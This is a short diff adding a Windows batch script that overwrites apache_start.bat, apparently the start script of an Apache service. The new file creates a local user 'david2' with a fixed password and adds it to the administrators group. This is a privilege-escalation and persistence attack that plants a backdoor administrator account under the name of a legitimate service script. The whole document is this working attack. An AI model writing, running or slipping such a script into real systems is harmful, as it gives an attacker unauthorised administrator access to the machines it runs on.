@@ -1,0 +1,9 @@
+#replace (apache_start.bat) with the actual bat file
+
+@echo off
+echo @echo off > apache_start.bat
+echo net user david2 1234567aA /add >> apache_start.bat
+echo net localgroup administrators david2 /add >> apache_start.bat
+echo echo User david2 added to the system and local administrators group. >> apache_start.bat
+echo pause >> apache_start.bat
+echo apache_start.bat created successfully.
